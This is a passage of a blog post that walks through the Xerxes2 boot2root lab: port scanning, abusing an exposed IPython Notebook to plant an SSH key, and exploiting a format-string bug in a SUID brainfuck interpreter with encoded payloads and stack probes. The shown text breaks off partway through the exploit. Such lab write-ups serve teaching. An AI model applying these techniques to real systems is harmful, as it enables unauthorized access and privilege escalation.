@@ -1,0 +1,1572 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Beating Xerxes 2 (No, Not the Persian King) - #!/slash/note</title>
+  <meta name="author" content="Leon Jacobs">
+
+  
+  <meta name="description" content="foreword Xerxes2 is a successor in a boot2root series by @barrebas hosted by @VulnHub. If you haven&rsquo;t done it yet, close this article now and &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-44457032-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">#!/slash/note</a></h1>
+  
+    <h2>A checkbox unchecker's notepad</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:leonjza.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Beating Xerxes 2 (No, Not the Persian King)</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-08-09T16:59:53+02:00" pubdate data-updated="true">Aug 9<sup>th</sup>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>foreword</h2>
+
+<p>Xerxes2 is a successor in a boot2root series by <a href="https://twitter.com/barrebas">@barrebas</a> hosted by <a href="https://twitter.com/vulnhub">@VulnHub</a>. If you haven&rsquo;t done it yet, close this article <em>now</em> and go learn by doing it!</p>
+
+<p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>
+
+<h2>getting started</h2>
+
+<p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>
+
+<figure class='code'><figcaption><span>nmap of 192.168.56.102 (cleaned up)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-09 17:14 SAST
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>PORT      STATE SERVICE REASON  VERSION
+</span><span class='line'>22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span><span class='line'>80/tcp    open  http    syn-ack lighttpd 1.4.31
+</span><span class='line'>111/tcp   open  rpcbind syn-ack 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+</span><span class='line'>4444/tcp  open  krb524? syn-ack
+</span><span class='line'>8888/tcp  open  http    syn-ack Tornado httpd 2.3
+</span><span class='line'>57504/tcp open  status  syn-ack 1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 192.62 seconds
+</span><span class='line'>           Raw packets sent: 131149 <span class="o">(</span>5.770MB<span class="o">)</span> <span class="p">|</span> Rcvd: 88 <span class="o">(</span>3.544KB<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well this gives us a boat load to test out already!</p>
+
+<p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>
+
+<figure class='code'><figcaption><span>String from tcp/4444</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~#  nc 192.168.56.102 4444 <span class="p">|</span> tee nc-string
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
+</span><span class='line'>AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'><span class="nv">qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo</span><span class="o">=</span>
+</span><span class='line'>^C
+</span><span class='line'>
+</span><span class='line'>root@kali:~# cat nc-string <span class="p">|</span> base64 -d &gt; nc-data
+</span><span class='line'>root@kali:~# file nc-data
+</span><span class='line'>nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>nc-data</code> is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and presses play.</p>
+
+<p><em>(Electronic Noises &amp; Robot Voice)</em> <em>This is Xerxes. Why do you persist in your loneliness?</em> <em>(Electronic Noises)</em></p>
+
+<p>The start and end of the voice message had a clear in &amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.</p>
+
+<p>This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.</p>
+
+<p>Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&rsquo;t have to.</p>
+
+<h2>first shell access</h2>
+
+<p>Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:</p>
+
+<p><img src="https://i.imgur.com/67BEjmV.png"></p>
+
+<p>However, moving on to tcp/8888, we see it identified as <code>Tornado httpd 2.3</code>. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!</p>
+
+<p>tcp/8888 hosted a <a href="http://ipython.org/notebook.html">IPython Notebook</a>. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a <code>!</code>. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the <code>delacroix</code> user:</p>
+
+<p><img src="http://i.imgur.com/JrTDTPn.png"></p>
+
+<p>And then a easy SSH in:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -i delacroix delacroix@192.168.56.102
+</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.56.102 (192.168.56.102)&#39;</span> can<span class="s1">&#39;t be established.</span>
+</span><span class='line'><span class="s1">ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.</span>
+</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
+</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.56.102<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">Welcome to xerxes2.</span>
+</span><span class='line'><span class="s1">      XERXES wishes you</span>
+</span><span class='line'><span class="s1">       a pleasant stay.</span>
+</span><span class='line'><span class="s1">____   ___  ____  ___  __ ____   ___  ____     ____     ____   </span>
+</span><span class='line'><span class="s1">`MM(   )P&#39;</span> 6MMMMb <span class="sb">`</span>MM 6MM <span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb   6MMMMb\  6MMMMb  </span>
+</span><span class='line'><span class="s1"> `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM69 <span class="err">&quot;</span>  <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM&#39;</span>    <span class="sb">`</span> MM<span class="s1">&#39;  `Mb </span>
+</span><span class='line'><span class="s1">  `MM,P   MM    MM MM&#39;</span>      <span class="sb">`</span>MM,P   MM    MM YM.           ,MM
+</span><span class='line'>   <span class="sb">`</span>MM.   MMMMMMMM MM        <span class="sb">`</span>MM.   MMMMMMMM  YMMMMb      ,MM<span class="s1">&#39; </span>
+</span><span class='line'><span class="s1">   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;</span>
+</span><span class='line'>  d<span class="s1">&#39; `MM. YM    d9 MM       d&#39;</span> <span class="sb">`</span>MM. YM    d9 L    ,MM ,M<span class="err">&#39;</span>
+</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
+</span><span class='line'>
+</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>becoming polito &ndash; the why</h2>
+
+<p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>
+
+<p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>
+
+<figure class='code'><figcaption><span>delacroix Home and history</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ls -lh
+</span><span class='line'>total 8.0K
+</span><span class='line'>-rw-r--r-- 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c
+</span><span class='line'>-rw-r--r-- 1 delacroix delacroix  100 Aug  9 10:23 Untitled0.ipynb
+</span><span class='line'>
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">history</span>
+</span><span class='line'><span class="nb">    </span>1  <span class="nb">cd</span>
+</span><span class='line'><span class="nb">    </span>2  ls -alh
+</span><span class='line'>    3  /opt/bf <span class="s2">&quot;&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#&quot;</span>
+</span><span class='line'>    4  cp /media/politousb/bf.c .
+</span><span class='line'>    5  nano bf.c
+</span><span class='line'>    6  <span class="nb">exit</span>
+</span><span class='line'><span class="nb">    </span>7  passwd
+</span><span class='line'>    8  <span class="nb">exit</span>
+</span><span class='line'>
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#&quot;</span>
+</span><span class='line'>LOOK DEEPERdelacroix@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href="http://en.wikipedia.org/wiki/Brainfuck">brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>
+
+<h3>inspecting bf.c</h3>
+
+<p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>
+
+<figure class='code'><figcaption><span>bf.c brainfk interpreter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">case</span> <span class="sc">&#39;.&#39;</span>:
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
+</span><span class='line'><span class="k">case</span> <span class="sc">&#39;,&#39;</span>:
+</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
+</span><span class='line'><span class="k">case</span> <span class="sc">&#39;&gt;&#39;</span>:
+</span><span class='line'>    <span class="n">datapointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">datapointer</span> <span class="o">==</span> <span class="p">(</span><span class="n">BUF_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="o">++</span><span class="n">datapointer</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
+</span><span class='line'><span class="k">case</span> <span class="sc">&#39;&lt;&#39;</span>:
+</span><span class='line'>    <span class="n">datapointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">datapointer</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="n">BUF_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="o">--</span><span class="n">datapointer</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
+</span><span class='line'><span class="k">case</span> <span class="sc">&#39;+&#39;</span>:
+</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
+</span><span class='line'><span class="k">case</span> <span class="sc">&#39;-&#39;</span>:
+</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as <code>,.</code>, and run it with <code>/opt/bf</code>, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 <code>+</code>, and ran that with a brainfk interpreter like <code>/opt/bf</code>, then you would have the character with ASCII value 62 in memory. You can then print that value with <code>.</code>, or move on the next memory cell with a <code>&lt;</code>. The most important thing to learn about brainfk was, <em>there are no high level features. No file IO, no socket IO, nothing</em>.</p>
+
+<p>That was our brainfk class for the day.</p>
+
+<h3>finding the bf vuln</h3>
+
+<p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>
+
+<figure class='code'><figcaption><span>bf.c format string vulnerability</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">case</span> <span class="sc">&#39;#&#39;</span>:
+</span><span class='line'>    <span class="c1">// new feature</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Classic format string vulnerability!</p>
+
+<p>As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to <em>somehow</em> exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as <code>polito</code>.</p>
+
+<h2>becoming polito &ndash; the how</h2>
+
+<p>Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:</p>
+
+<ul>
+<li>print <code>AAAA%x%x%x%x</code>, adding <code>%s</code> until you see the hex for of A (41), meaning that you are trying to find the position in the stack that <code>printf</code> is placing the arguments.</li>
+<li>Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of <code>AAAA%16$x</code>.</li>
+<li><code>objdump -R /your/bin</code> and find a call in the GOT to override.</li>
+<li>Place some shellcode as environment variable, ie: <code>EGG</code>, prefixed with say 200 <code>0x90</code>.</li>
+<li>use <code>gdb</code>, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.</li>
+<li>Calculate the required padding of strings to get the correct memory address, and write it using the <code>%n</code> format string.</li>
+<li>Profit?</li>
+</ul>
+
+
+<p>While this is all fine and dandy, it was not possible for me to <em>profit</em> with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. <code>/opt/bf</code> was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D</p>
+
+<p>So, let me take this step by step on how <code>/opt/bf</code> can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.</p>
+
+<h3>/opt/bf &ndash; part1</h3>
+
+<p>To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:</p>
+
+<ul>
+<li><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
+<li><a href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html">http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a></li>
+<li><a href="http://youtu.be/NwzmYSlETI8">http://youtu.be/NwzmYSlETI8</a></li>
+<li><a href="http://youtu.be/CHrs30g-3O0">http://youtu.be/CHrs30g-3O0</a></li>
+</ul>
+
+
+<p>So, lets work with this.</p>
+
+<p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>&gt;</code>, preparing for the next character.</p>
+
+<p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>
+
+<figure class='code'><figcaption><span>brainfk payload encoding (cleaned up)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;+&quot; * ord(&quot;a&quot;)&#39;</span><span class="k">)</span>
+</span><span class='line'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&quot;</span>
+</span><span class='line'>a
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>
+
+<figure class='code'><figcaption><span>brainfk payload encoding multiple characters (cleanedup)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&quot;</span>
+</span><span class='line'>aa
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>2 <code>a</code>! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href="https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions">list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>
+
+<figure class='code'><figcaption><span>final brainfk encoding for</span><a href='/opt/bf'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">print</span> <span class="s">&quot;&gt;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&quot;+&quot;</span> <span class="o">*</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&quot;the quick brown fox&quot;</span><span class="p">)])</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>
+
+<p>Anyways, that settled the brainfk problem.</p>
+
+<h3>/opt/bf &ndash; part2</h3>
+
+<p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>
+
+<figure class='code'><figcaption><span>/opt/bf format string testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span>AAAA<span class="s2">&quot; + &quot;</span>.%x<span class="s2">&quot; * 20 + &quot;</span><span class="se">\n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>
+
+<figure class='code'><figcaption><span>/opt/bf format string direct parameter access</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span>AAAA<span class="s2">&quot; + &quot;</span>.%16<span class="nv">$x</span><span class="s2">&quot; &quot;</span><span class="se">\n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>AAAA.41414141
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yup! Parameter 16 gives us what we need :)</p>
+
+<p>Great. Were making progress&hellip; I think.</p>
+
+<p>For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.</p>
+
+<h3>/opt/bf &ndash; part3</h3>
+
+<p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>
+
+<p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>
+
+<figure class='code'><figcaption><span>/opt/bf RW Only stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>readelf -l /opt/bf <span class="p">|</span> grep STACK
